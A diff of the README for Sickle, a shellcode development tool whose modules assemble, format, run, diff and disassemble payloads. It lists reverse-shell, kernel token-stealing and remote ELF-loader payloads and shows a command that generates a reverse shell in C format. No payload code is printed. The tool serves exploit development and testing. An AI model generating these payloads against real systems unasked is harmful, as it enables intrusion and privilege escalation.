@@ -6,55 +6,53 @@ Sickle is a tool I originally developed to help me be more effective, in both de
 
 Currently sickle can assist in the following.
 
-- Shellcode Generation
+- Converting assembly instructions to machine code (opcodes)
+- Executing bytecode, including generated payloads
+- Formatting opcodes for a target language
+- Bad character identification
+- Linear disassembly
 - Diffing
-- Bad Character Identification
-- Shellcode Execution
-- Disassembly
-- Shellcode Extraction
-
-**WARNING**: Sickle is currently undergoing massive changes to support shellcode generation. For a stable version, please use the latest release.
 
 ## Shellcode Generation
 
-Sickle supports shellcode generation via the [Keystone Engine](https://www.keystone-engine.org/). Due to this being a newly added feature, payload support is limited.
+Sickle supports shellcode generation via the [Keystone Engine](https://www.keystone-engine.org/). Due to this being a newly added feature, payload support is limited. However, the goal is to add a basic reverse shell for each architecture and platform.
 
 ![alt text](./docs/screenshots/generation.gif)
 
 ## Diffing
 
-This functionality of sickle was originally implemented to aid me in understanding public shellcode stubs. When assembly diffing is performed the diff will occur on both the assembly and opcode level individually.
+Sickle includes a "diffing" module initially designed for analyzing shellcode stubs. The original "asm" mode performs linear disassembly diffs at both the assembly language and opcode levels separately.
 
 ![alt text](./docs/screenshots/diff_shellcode.png)
 
-Additionally, sickle supports multiple modes in which to perform the diff and can be useful even outside of shellcode development. Notably sickle currently supports both Windows and Linux for all modules not just diffing.
+In addition, Sickle offers various modes for performing diffs, making it useful beyond shellcode development.
 
 ![alt text](./docs/screenshots/hexdump_diff.png)
 
 ## Shellcode Execution
 
-A task you may find yourself doing repeatedly is testing your shellcode. These steps normally involve:
+One common task you may often perform is testing your shellcode. This process typically involves the following steps:
 
-1. Compiling assembly language
-2. Extracting shellcode into the proper format for your respective wrapper
-3. Compiling the wrapper
-4. Executing it
+1. Compile the assembly language code.
+2. Extract the shellcode and format it appropriately for your chosen wrapper.
+3. Compile the wrapper.
+4. Execute the wrapper.
 
-Although these steps may not seem like a lot they add up when you do them over and over until you get your expected outcome. Sickle takes care of placing the shellcode into a wrapper for quick testing and works on both Windows and Unix systems.
+Although these steps may seem minor, they can become time-consuming when done repeatedly. Sickle simplifies the process by automatically wrapping shellcode for quick testing, and the "run" module currently supports both Windows and Unix systems.
 
 ![alt text](./docs/screenshots/r.png)
 
 ## Disassembly
 
-Sickle can also take a binary file and convert the extracted opcodes (shellcode) to machine instructions (assembly). Keep in mind this works with raw binary only and disassembly is currently only done in a linear fashion.
+Sickle can also convert a binary file into extracted opcodes (shellcode) and then translate those into machine instructions (assembly). Note that this process only works with raw binary files and currently performs disassembly in a linear fashion.
 
 ![alt text](./docs/screenshots/disassemble.png)
 
-Shown above the module disassembles a reverse shell designed by Stephen Fewer to assembly.
+In the example shown above the "disassemble" module disassembles a reverse shell designed by Stephen Fewer to assembly.
 
 ## Shellcode Extraction
 
-Shellcode extraction was the first module or rather functionality for sickle as opcodes are interpreted differently depending on the wrapper you are using. You cannot expect JavaScript to store and interpret shellcode the same way a C program would.
+Shellcode extraction was the first module, or rather, the core functionality for Sickle, as opcodes are interpreted differently depending on the wrapper used. JavaScript, for example, does not store and interpret shellcode in the same way as a C program would.
 
 ![alt text](./docs/gifs/format.gif)
 
@@ -62,36 +60,38 @@ Perhaps the biggest inspiration for this was `msfvenom`.
 
 ## Bad Character Identification
 
-Although not prevalent in 64bit exploits there may be times an exploit restricts certain characters from being used. This is where the pinpoint module shines as it directly shows the assembly instructions responsible for the identified bad character.
+Although less common in 64-bit exploits, there may be instances where an exploit restricts the use of certain characters. This is where the "pinpoint" module excels, as it directly identifies and highlights the assembly instructions responsible for the identified bad character(s).
 
 ![alt text](./docs/gifs/pinpoint.gif)
 
 # Module Based Design
 
-This tool was originally designed as a one big script, however as the tool evolved, I found myself needing to re-learn my code every update. As such, sickle now follows a modular approach with the goal being to implement new functionality as needed with minimal time spent re-learning sickles design.
+Originally, this tool started as a single large script. However, as it evolved, I found myself needing to re-learn the code with each update. To address this, Sickle now follows a modular approach, allowing for new functionality to be added with minimal time spent re-learning the tool’s design.
 
 ```
 $ sickle -l
 
   Shellcode                                                                        Description
   ---------                                                                        -----------
-  windows/x64/kernel_token_stealer                                                 Kernel token stealing shellcode (Windows x64)
-  windows/x64/kernel_sysret                                                        Kernel shellcode for returning to user-mode from kernel-mode
+  windows/x64/kernel_token_stealer                                                 Kernel token stealing shellcode
+  windows/x64/kernel_sysret                                                        Generic method of returning from kernel space to user space
   windows/x64/kernel_ace_edit                                                      Kernel shellcode to modify the _SECURITY_DESCRIPTOR of a process
-  windows/x64/shell_reverse_tcp                                                    TCP based reverse shell over IPV4 which returns an interactive cmd.exe session
-  windows/x86/kernel_token_stealer                                                 Kernel token stealing shellcode (Windows x86)
-  linux/aarch64/shell_reverse_tcp                                                  TCP based reverse shell over IPV4 which returns an interactive /bin/sh session (Linux AARCH64)
-  linux/x86/shell_reverse_tcp                                                      TCP based reverse shell over IPV4 which returns an interactive /bin/sh session (Linux x86)
+  windows/x64/shell_reverse_tcp                                                    A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe session
+  windows/x86/kernel_token_stealer                                                 Kernel token stealing shellcode
+  linux/aarch64/memfd_reflective_elf_tcp                                           TCP-based reflective ELF loader over IPV4 which executes an ELF from a remote server
+  linux/aarch64/shell_reverse_tcp                                                  TCP-based reverse shell over IPV4 that provides an interactive /bin/sh session
+  linux/x64/memfd_reflective_elf_tcp                                               TCP-based reflective ELF loader over IPV4 which executes an ELF from a remote server
+  linux/x86/shell_reverse_tcp                                                      TCP-based reverse shell over IPV4 that provides an interactive /bin/sh session
 
   Modules             Description
   -------             -----------
   asm_shell           Interactive assembler and disassembler
   disassemble         Simple linear disassembler for multiple architectures
-  diff                Bytecode diffing too for comparing two binaries (or shellcode)
-  format              Converts bytecode into a respective format
-  run                 Wrapper used for executing bytecode
-  badchar             Generates bad characters for bad character validation
-  pinpoint            Highlight bad characters within a disassembly to id bad characters
+  diff                Bytecode diffing module for comparing two binaries (or shellcode)
+  format              Converts bytecode into a respective format (activated anytime '-f' is used)
+  run                 Wrapper used for executing bytecode (shellcode)
+  badchar             Produces a set of all potential invalid characters for validation purposes
+  pinpoint            Highlights opcodes within a disassembly to identify instructions responsible for bad characters
 
   Format              Description
   ------              -----------
@@ -115,7 +115,7 @@ $ sickle -l
   ruby                Format bytecode for Ruby
 ```
 
-Allowing for a way to self-document each functionality provided by respective modules.
+This approach allows each module the ability to generate detailed documentation for its functionality.
 
 ```
 $ sickle -i -m run                            
@@ -147,8 +147,7 @@ Example:
     sickle.py -m run -r shellcode
 ```
 
-
-This also includes shellcode stubs.
+This approach also includes documentation for shellcode stubs.
 
 ```
 $ sickle -i -p linux/aarch64/shell_reverse_tcp
@@ -158,14 +157,14 @@ Usage information for linux/aarch64/shell_reverse_tcp
               Name: Linux (AARCH64 or ARM64) SH Reverse Shell
             Module: linux/aarch64/shell_reverse_tcp
       Architecture: aarch64
-          Platform: Linux
+          Platform: linux
               Ring: 3
 
 Author(s):
     wetw0rk
 
 Tested against:
-    Kali Linux
+    Debian 14.2.0-6
 
 Argument Information
 
@@ -176,10 +175,11 @@ Argument Information
 
 Description:
     
-    Simple reverse shellcode that will spawn a connection back to a listening tcp
-    server. Connection is made via TCP over IPV4.
+    TCP-based reverse shell over IPV4 that provides an interactive /bin/sh
+    session. Since this payload is not staged, there is no need for anything
+    more than a Netcat listener.
     
 Example:
 
-    sickle.py -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c
+    src/sickle.py -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c
 ```
